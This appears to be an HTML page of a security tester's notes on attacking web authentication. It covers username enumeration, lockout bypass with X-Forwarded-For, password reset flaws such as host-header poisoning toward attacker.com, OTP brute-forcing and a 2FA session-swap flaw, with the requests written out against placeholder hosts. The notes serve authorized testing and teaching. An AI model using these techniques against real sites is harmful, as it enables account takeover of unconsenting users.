@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Explore key authentication testing techniques like username enumeration, password reset flaws, 2FA bypasses, and account lockout analysis.">
+  <title>offsecnotes | Authentication</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Authentication</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#username-enumeration" id="toc-username-enumeration">Username Enumeration</a>
+<ul>
+<li><a href="#registration-form" id="toc-registration-form">Registration Form</a></li>
+<li><a href="#response-comparison" id="toc-response-comparison">Response Comparison</a></li>
+<li><a href="#response-timing-analysis" id="toc-response-timing-analysis">Response Timing Analysis</a></li>
+</ul></li>
+<li><a href="#password-attacks" id="toc-password-attacks">Password Attacks</a></li>
+<li><a href="#account-locking-mechanisms" id="toc-account-locking-mechanisms">Account Locking Mechanisms</a></li>
+<li><a href="#password-reset-vulnerabilities" id="toc-password-reset-vulnerabilities">Password Reset Vulnerabilities</a>
+<ul>
+<li><a href="#controlling-the-username-parameter" id="toc-controlling-the-username-parameter">Controlling the Username Parameter</a></li>
+<li><a href="#predictable-password-reset-urls" id="toc-predictable-password-reset-urls">Predictable Password Reset URLs</a></li>
+<li><a href="#analyze-randomness" id="toc-analyze-randomness">Analyze Randomness</a></li>
+<li><a href="#hijacking-password-reset-links" id="toc-hijacking-password-reset-links">Hijacking Password Reset Links</a></li>
+</ul></li>
+<li><a href="#two-factor-authentication-2fa-bypasses" id="toc-two-factor-authentication-2fa-bypasses">Two-Factor Authentication (2FA) Bypasses</a>
+<ul>
+<li><a href="#brute-forcing-otp" id="toc-brute-forcing-otp">Brute-Forcing OTP</a></li>
+<li><a href="#skipping-2fa-steps" id="toc-skipping-2fa-steps">Skipping 2FA Steps</a></li>
+<li><a href="#exploiting-2fa-logic-flaws" id="toc-exploiting-2fa-logic-flaws">Exploiting 2FA Logic Flaws</a></li>
+</ul></li>
+<li><a href="#remember-me-cookie-attacks" id="toc-remember-me-cookie-attacks">“Remember Me” Cookie Attacks</a></li>
+<li><a href="#password-change" id="toc-password-change">Password change</a></li>
+</ul></div>
+  <hr>
+<h2 id="username-enumeration">Username Enumeration</h2>
+<p>Finding valid usernames is the first step in many attacks. Test every feature interacting with user accounts (e.g., login, registration, password recovery).</p>
+<details>
+<summary>
+Common Default Usernames
+</summary>
+<p>Default usernames to test:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">admin</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">administrator</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">root</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">firstname.lastname@somecompany.com</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="bu">test</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">guest</span></span></code></pre></div>
+</details>
+<h3 id="registration-form">Registration Form</h3>
+<p>If the application states “Account already exists” when registering a known email, it leaks user existence.</p>
+<h3 id="response-comparison">Response Comparison</h3>
+<p>Compare server responses when entering:</p>
+<ul>
+<li>A valid username with incorrect passwords</li>
+<li>An invalid username with incorrect passwords</li>
+</ul>
+<p>Even minor differences in error messages can reveal valid usernames.</p>
+<blockquote>
+<p><strong>Tip</strong>: Use Burp Suite’s “Grep - Match” feature in Intruder to detect response variations.</p>
+</blockquote>
+<h3 id="response-timing-analysis">Response Timing Analysis</h3>
+<p>Some systems check passwords only if the username is valid. Sending an excessively long password may create a delay, indicating the username exists.</p>
+<hr />
+<h2 id="password-attacks">Password Attacks</h2>
+<p><a href="/Misc/password%20cracking.html">Cracking passwords</a> is a key part of authentication testing.</p>
+<hr />
+<h2 id="account-locking-mechanisms">Account Locking Mechanisms</h2>
+<p>Check if accounts lock after multiple failed attempts (e.g., 3 or 5 attempts). Understand the lockout mechanism:</p>
+<ul>
+<li><strong>Testing Responses</strong>: Attempt logins with an incorrect password on a locked account, then with the correct password. If responses differ, the lock might be bypassable.</li>
+<li><strong>IP-Based Lockout</strong>:
+<ul>
+<li>Try to see if the failed attempts counter resets if the IP owner logs in successfully. (Make sure that concurrent requests is set to 1)</li>
+<li>Try bypassing by adding the <code>X-Forwarded-For</code> header.</li>
+</ul></li>
+</ul>
+<hr />
+<h2 id="password-reset-vulnerabilities">Password Reset Vulnerabilities</h2>
+<h3 id="controlling-the-username-parameter">Controlling the Username Parameter</h3>
+<p>If the reset request contains a <code>username</code> parameter, test if it can be changed:</p>
+<pre class="http"><code>POST /forgot-password HTTP/2
+Host: vulnerable-website.com
+
+user=&lt;victim&gt;&amp;new-pwd=NewPass123&amp;token=xyz</code></pre>
+<h3 id="predictable-password-reset-urls">Predictable Password Reset URLs</h3>
+<p>Some sites use static or weakly random reset links. Test if a simple enumeration allows taking over accounts.</p>
+<pre class="http"><code>http://vulnerable-website.com/reset-password?user=victim-user</code></pre>
+<h3 id="analyze-randomness">Analyze Randomness</h3>
+<p>Use <strong>Burp Sequencer</strong> to analyze the quality of randomness of the token.</p>
+<h3 id="hijacking-password-reset-links">Hijacking Password Reset Links</h3>
+<p>Try injecting an <code>X-Forwarded-Host</code> header to change the reset link destination:</p>
+<pre class="http"><code>POST /forgot-password HTTP/2
+Host: vulnerable-website.com
+X-Forwarded-Host: attacker.com
+
+username=victim</code></pre>
+<hr />
+<h2 id="two-factor-authentication-2fa-bypasses">Two-Factor Authentication (2FA) Bypasses</h2>
+<h3 id="brute-forcing-otp">Brute-Forcing OTP</h3>
+<p>If the OTP code is short (e.g., 4-6 digits), brute-force it.</p>
+<h3 id="skipping-2fa-steps">Skipping 2FA Steps</h3>
+<p>Check if you can directly access logged-in pages without completing 2FA.</p>
+<h3 id="exploiting-2fa-logic-flaws">Exploiting 2FA Logic Flaws</h3>
+<pre class="http"><code># Step 1: Login with attacker account
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+
+username=attacker&amp;password=qwerty</code></pre>
+<pre class="http"><code># Step 2: Server sets a session cookie
+HTTP/1.1 200 OK
+Set-Cookie: session=attacker</code></pre>
+<pre class="http"><code># Step 3: Request 2FA page with attacker&#39;s session
+GET /login-steps/second HTTP/1.1
+Cookie: session=attacker</code></pre>
+<pre class="http"><code># Step 4: Submit the attacker&#39;s OTP using the victim&#39;s session
+POST /login-steps/second HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=victim
+
+verification-code=123456</code></pre>
+<hr />
+<h2 id="remember-me-cookie-attacks">“Remember Me” Cookie Attacks</h2>
+<ul>
+<li>Study how “Remember Me” cookies are generated (e.g., Base64 encoding or hashed values).</li>
+<li>Attempt brute-forcing attack.</li>
+</ul>
+<hr />
+<h2 id="password-change">Password change</h2>
+<p>See if you can change the password of an arbitrary user.</p>
+<ul>
+<li>Look for a hidden username parameter that you can control.</li>
+<li>Brute-force password when you enter your current password.</li>
+<li>Test all current &amp; new password combinations.</li>
+</ul>
+<div class="sourceCode" id="cb9"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="an">current password:</span><span class="co"> &lt;wrong&gt;, new-password-1=XXX, new-password-2=XXX</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="an">current password:</span><span class="co"> &lt;wrong&gt;, new-password-1=XXX, new-password-2=YYY</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="an">current password:</span><span class="co"> &lt;correct&gt;, new-password-1=XXX, new-password-2=XXX</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="an">current password:</span><span class="co"> &lt;correct&gt;, new-password-1=XXX, new-password-2=YYY</span></span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
